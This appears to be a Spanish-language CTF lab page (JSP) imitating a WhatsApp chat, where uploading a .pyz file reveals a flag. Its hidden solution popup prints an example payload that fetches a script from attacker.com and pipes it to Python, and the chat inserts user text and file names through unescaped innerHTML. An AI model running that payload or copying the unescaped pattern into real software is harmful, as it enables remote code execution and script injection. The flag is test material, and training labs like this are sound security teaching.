<%@ page contentType="text/html; charset=UTF-8" language="java"%>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>WhatsApp Fake</title>
  <link rel="icon" type="image/png" href="<%= request.getContextPath() %>/img/icono/icono_cinco_hackend.ico">
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Roboto', sans-serif;
    }

    body {
      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .iphone-container {
      width: 390px;
      height: 844px;
      background-color: #000;
      border-radius: 60px;
      padding: 16px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6);
      position: relative;
      /* ✅ Añade esto: */
  	  margin-top: 110px;
    }

    .notch {
      position: absolute;
      top: 12px;
      left: 50%;
      transform: translateX(-50%);
      width: 160px;
      height: 30px;
      background-color: #111;
      border-radius: 20px;
      z-index: 2;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0 10px;
      margin-top: 10px;
    }

    .camera {
      width: 12px;
      height: 12px;
      background-color: #000;
      border-radius: 50%;
      border: 2px solid #333;
    }

    .sensor {
      width: 8px;
      height: 8px;
      background-color: #333;
      border-radius: 50%;
    }

    .whatsapp-ui {
      background-color: #e5ddd5;
      border-radius: 40px;
      overflow: hidden;
      height: 100%;
      display: flex;
      flex-direction: column;
      position: relative;
      z-index: 1;
    }

    .chat-header {
      background-color: #f8f8f8;
      padding: 35px 16px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      border-bottom: 1px solid #ddd;
    }

    .header-left {
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .chat-header img {
      width: 40px;
      height: 40px;
      border-radius: 50%;
    }

    .contact-info {
      display: flex;
      flex-direction: column;
      line-height: 1.2;
    }

    .contact-info strong {
      font-size: 15px;
      color: #000;
    }

    .contact-info small {
      font-size: 12px;
      color: green;
    }

    .back {
      font-size: 20px;
      cursor: pointer;
      color: #007aff;
    }

    .back a {
  text-decoration: none;
  color: #007aff;
}

.back a:visited,
.back a:hover,
.back a:active,
.back a:focus {
  color: #007aff;
  text-decoration: none;
}

    .info-icon {
      font-size: 20px;
      cursor: pointer;
      color: #007aff;
    }

    .chat-body {
      flex: 1;
      padding: 20px;
      overflow-y: auto;
      background-image: url('https://www.transparenttextures.com/patterns/connected.png');
      background-color: #e5ddd5;
      background-repeat: repeat;
      background-size: auto;
    }

    .chat-footer {
      padding: 12px 15px;
      background-color: #f0f0f0;
      display: flex;
      gap: 10px;
      align-items: center;
      border-top: 1px solid #ccc;
    }

    .chat-footer input {
      flex: 1;
      padding: 10px 15px;
      border-radius: 30px;
      border: 1px solid #ccc;
      outline: none;
      font-size: 14px;
    }

    .message-block {
      display: flex;
      flex-direction: column;
      gap: 4px;
    }

    .message {
      max-width: 70%;
      padding: 10px 14px;
      border-radius: 18px;
      margin: 10px 0;
      position: relative;
      display: inline-block;
      word-wrap: break-word;
      clear: both;
      font-size: 14px;
      line-height: 1.4;
      box-shadow: 0 1px 1px rgba(0,0,0,0.1);
    }

    .message.user {
      background-color: #dcf8c6;
      margin-left: auto;
      margin-right: 8px;
      border-bottom-right-radius: 0;
    }

    .message.user::after {
      content: "";
      position: absolute;
      bottom: 0;
      right: -8px;
      width: 0;
      height: 0;
      border: 8px solid transparent;
      border-top-color: #dcf8c6;
      border-bottom: 0;
      border-left: 0;
      margin-bottom: -1px;
    }

    .message.bot {
      background-color: #fff;
      margin-right: auto;
      margin-left: 8px;
      border-bottom-left-radius: 0;
    }

    .message.bot::after {
      content: "";
      position: absolute;
      bottom: 0;
      left: -8px;
      width: 0;
      height: 0;
      border: 8px solid transparent;
      border-top-color: #fff;
      border-bottom: 0;
      border-right: 0;
      margin-bottom: -1px;
    }

    .time {
      display: block;
      text-align: right;
      font-size: 10px;
      color: #888;
      margin-top: 5px;
    }

    .chat-footer button {
      background-color: #075E54;
      color: white;
      border: none;
      padding: 10px;
      border-radius: 50%;
      cursor: pointer;
      font-size: 18px;
      width: 42px;
      height: 42px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    /* Popup */
    .info-popup {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: #fff;
      z-index: 5;
      display: none;
      flex-direction: column;
      align-items: center;
      padding: 40px 20px;
      border-radius: 40px;
    }

    .info-popup.active {
      display: flex;
    }

    .info-popup .close-btn {
      align-self: flex-end;
      font-size: 20px;
      cursor: pointer;
      margin-bottom: 10px;
      color: #007aff;
    }

    .info-content {
      text-align: center;
      color: #000;
    }

    .info-content img {
      width: 100px;
      height: 100px;
      border-radius: 50%;
      margin-bottom: 15px;
    }

    .info-content h2 {
      margin-bottom: 5px;
    }

    .info-content p {
      margin: 4px 0;
    }
    
 .solution-button {
  position: absolute;
  bottom: 20px;
  right: 20px;
  background-color: #00bcd4;
  color: white;
  border: none;
  border-radius: 50%;
  padding: 12px;
  font-size: 20px;
  cursor: pointer;
  box-shadow: 0 4px 8px rgba(0,0,0,0.3);
  transition: background-color 0.3s ease;
}

.solution-button:hover {
  background-color: #0097a7;
}

.popup-solucion {
  display: none;
  position: fixed;
  z-index: 9999;
  left: 0;
  top: 0;
  width: 100%;
  height: 100%;
  background-color: rgba(0,0,0,0.7);
}

.popup-solucion-content {
  background-color: #111;
  color: white;
  margin: auto;
  padding: 20px;
  border-radius: 10px;
  width: 80%;
  max-width: 500px;
  position: relative;
  top: 50%;
  transform: translateY(-50%);
}

.popup-solucion pre {
  background: #2d2d2d;
  padding: 10px;
  border-radius: 5px;
  overflow-x: auto;
}

.close-solucion {
  position: absolute;
  top: 10px;
  right: 15px;
  font-size: 24px;
  cursor: pointer;
  color: #fdd835;
}


    

    .action-buttons {
      display: flex;
      justify-content: space-around;
      margin-top: 25px;
      width: 100%;
    }

    .action-buttons button {
      background-color: #e0e0e0;
      border: none;
      border-radius: 12px;
      padding: 10px 14px;
      font-size: 16px;
      cursor: pointer;
      display: flex;
      align-items: center;
      gap: 6px;
      transition: background-color 0.2s ease;
    }

    .action-buttons button:hover {
      background-color: #d4d4d4;
    }

    .action-buttons span {
      font-size: 14px;
      color: #333;
    }
    /* Estilo para los puntos de "escribiendo..." */
  .typing .dots span {
    animation: blink 1s infinite;
    font-size: 20px;
    color: #555;
    margin-right: 2px;
  }

  .typing .dots span:nth-child(2) {
    animation-delay: 0.2s;
  }

  .typing .dots span:nth-child(3) {
    animation-delay: 0.4s;
  }

  @keyframes blink {
    0%, 80%, 100% {
      opacity: 0;
    }
    40% {
      opacity: 1;
    }
  }
  
  .vuln-popup {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(0, 0, 0, 0.4); /* fondo semi-transparente */
    display: none;
    align-items: center;
    justify-content: center;
    z-index: 999;
  }

  .vuln-popup-content {
    background-color: #fff;
    padding: 20px 30px;
    border-radius: 20px;
    box-shadow: 0 5px 15px rgba(0,0,0,0.3);
    text-align: center;
    max-width: 300px;
    width: 90%;
    position: relative;
    animation: popup-fade 0.3s ease-out;
  }

  .vuln-popup-content h2 {
    margin-bottom: 10px;
    color: #e53935;
    font-size: 20px;
  }

  .vuln-popup-content p {
    margin: 8px 0;
    font-size: 14px;
    color: #333;
  }

  .vuln-popup .close-btn {
    position: absolute;
    top: 8px;
    right: 12px;
    font-size: 18px;
    color: #888;
    cursor: pointer;
  }

  @keyframes popup-fade {
    from { transform: scale(0.8); opacity: 0; }
    to { transform: scale(1); opacity: 1; }
  }
  </style>
</head>
<body>
  <div class="iphone-container">
    <div class="notch">
      <div class="camera"></div>
      <div class="sensor"></div>
    </div>
    <div class="whatsapp-ui">
      <div class="chat-header">
        <div class="header-left">
          <span class="back"><a href="<%= request.getContextPath() %>/labs/whatsapp_fake/contactos.jsp">←</a></span>
          <img src="https://randomuser.me/api/portraits/women/44.jpg" alt="Foto de perfil">
          <div class="contact-info">
            <strong>Sra.Jonshon</strong>
            <small>En línea</small>
          </div>
        </div>
        <span class="info-icon" onclick="togglePopup()">ℹ️</span>
      </div>

      <div class="chat-body" id="chatBody"></div>

      <div class="chat-footer">
		  <input type="text" id="messageInput" placeholder="Escribe un mensaje...">
		  <input type="file" id="fileInput" style="display: none;" onchange="handleFileUpload(event)">
		  <button onclick="sendMessage()">📤</button>
		  <button onclick="document.getElementById('fileInput').click()">📎</button>
	  </div>

      <!-- POPUP INFO -->
      <div class="info-popup" id="infoPopup">
        <span class="close-btn" onclick="togglePopup()">✖</span>
        <div class="info-content">
          <img src="https://randomuser.me/api/portraits/women/44.jpg" alt="Foto de perfil">
          <h2>Sra.Jonshon</h2>
          <p>Estado: En línea</p>
          <p>Número: +34 600 123 456</p>
          <p>Última conexión: Hoy a las 10:30</p>
          <div class="action-buttons">
            <button onclick="togglePopup();document.getElementById('messageInput').focus();">
              📩<span>Mensaje</span>
            </button>
            <button onclick="alert('Llamando...')">
              📞<span>Llamar</span>
            </button>
            <button onclick="alert('Iniciando videollamada...')">
              🎥<span>Video</span>
            </button>
          </div>
          <button id="show-solution-btn" class="solution-button">💡</button>
        </div>
      </div>
    </div>
  </div>

<div class="vuln-popup" id="vulnPopup">
  <div class="vuln-popup-content">
    <span class="close-btn" onclick="document.getElementById('vulnPopup').style.display='none'">✖</span>
    <h2>🎯 Vulnerabilidad Descubierta!</h2>
    <p>¡Subiste un archivo .pyz y explotaste la falla!</p>
    <p><strong>FLAG: FLAG{whatsapp_fake_flag}</strong></p>
  </div>
</div>


  <script>
  const respuestas = [
    "¡Claro! Te ayudo con eso.",
    "Déjame pensarlo un momento...",
    "Ahora mismo te respondo 😊",
    "¡Qué interesante lo que dices!",
    "Voy a revisar eso enseguida.",
    "No había pensado en eso 🤔",
    "¡Por supuesto!",
    "Déjame consultarlo...",
    "Ahora mismo te lo digo!",
    "😄 jajaja, tienes razón."
  ];

  function sendMessage() {
    const input = document.getElementById("messageInput");
    const message = input.value.trim();
    if (message === "") return;

    const chatBody = document.getElementById("chatBody");

    const messageBlock = document.createElement("div");
    messageBlock.className = "message-block";

    // Mensaje del usuario
    const userMsg = document.createElement("div");
    userMsg.className = "message user";
    userMsg.innerHTML = message + '<span class="time">✔✔ ' + getTime() + '</span>';
    messageBlock.appendChild(userMsg);

    chatBody.appendChild(messageBlock);
    chatBody.scrollTop = chatBody.scrollHeight;
    input.value = "";

    // Crear "escribiendo..." (3 puntos animados)
    const typingBlock = document.createElement("div");
    typingBlock.className = "message bot typing";
    typingBlock.innerHTML = '<span class="dots"><span>.</span><span>.</span><span>.</span></span>';
    chatBody.appendChild(typingBlock);
    chatBody.scrollTop = chatBody.scrollHeight;

    // Después de un delay, quitar "escribiendo..." y poner una respuesta
    setTimeout(() => {
      chatBody.removeChild(typingBlock);

      const responseBlock = document.createElement("div");
      responseBlock.className = "message bot";
      const randomResponse = respuestas[Math.floor(Math.random() * respuestas.length)];
      responseBlock.innerHTML = randomResponse + '<span class="time">✔✔ ' + getTime() + '</span>';
      chatBody.appendChild(responseBlock);
      chatBody.scrollTop = chatBody.scrollHeight;
    }, 3000); // Espera 3 segundos
  }

  function getTime() {
    const now = new Date();
    const hours = now.getHours().toString().padStart(2, '0');
    const minutes = now.getMinutes().toString().padStart(2, '0');
    return hours + ":" + minutes;
  }

  function togglePopup() {
    const popup = document.getElementById("infoPopup");
    popup.classList.toggle("active");
  }
  
  function handleFileUpload(event) {
    const file = event.target.files[0];
    if (!file) return;

    const chatBody = document.getElementById("chatBody");

    const messageBlock = document.createElement("div");
    messageBlock.className = "message-block";

    const fileMsg = document.createElement("div");
    fileMsg.className = "message user";

    // Aquí usamos comillas normales + concatenación para evitar errores de JSP
    fileMsg.innerHTML = 
      '<img src="" alt="Archivo no disponible" style="width: 150px; height: auto; border-radius: 10px; background: #ccc; object-fit: cover; display: block; margin-bottom: 5px;">' +
      '<div style="font-size: 12px; color: gray;">' + file.name + '</div>' +
      '<span class="time">✔✔ ' + getTime() + '</span>';

    messageBlock.appendChild(fileMsg);
    chatBody.appendChild(messageBlock);
    chatBody.scrollTop = chatBody.scrollHeight;

    const fileName = file.name;
    const extension = fileName.split('.').pop().toLowerCase();

    if (extension === "pyz") {
      // Mostrar el popup de vulnerabilidad
      document.getElementById('vulnPopup').style.display = 'flex';
    } else {
      alert("Archivo subido: " + fileName);
    }

    // Limpiar el input para permitir volver a cargar el mismo archivo si se quiere
    event.target.value = "";
  }
  
  // boton mostrar solucion
  window.addEventListener('DOMContentLoaded', () => {
    const showSolutionBtn = document.getElementById('show-solution-btn');
    const solucionPopup = document.getElementById('solucion-popup');
    const closeSolucion = document.querySelector('.close-solucion');

    // Abrir popup de solución
    if (showSolutionBtn && solucionPopup) {
      showSolutionBtn.addEventListener('click', () => {
        solucionPopup.style.display = 'block';
      });
    }

    // Cerrar popup de solución
    if (closeSolucion) {
      closeSolucion.addEventListener('click', () => {
        solucionPopup.style.display = 'none';
      });
    }

    // Cerrar haciendo clic fuera del contenido
    window.addEventListener('click', (e) => {
      if (e.target === solucionPopup) {
        solucionPopup.style.display = 'none';
      }
    });
  });


</script>
<div id="solucion-popup" class="popup-solucion">
  <div class="popup-solucion-content">
    <span class="close-solucion">&times;</span>
    <h2>Solucion</h2>
    <p>
      WhatsApp permite enviar archivos con extensión <code>.pyz</code>, que son ejecutables en sistemas con Python. Esta extensión puede camuflar scripts maliciosos y, si el usuario los ejecuta, podría permitir la ejecución remota de código (RCE).
    </p>
    <p><strong>Ejemplo de payload:</strong></p>
    <pre><code>import os
os.system("curl http://attacker.com/shell.py | python")</code></pre>
    <p>
      En un CTF, esta vulnerabilidad puede explotarse enseñando cómo un archivo aparentemente inofensivo puede ejecutar código remoto si se abre sin verificar.
    </p>
  </div>
</div>

</body>
</html>
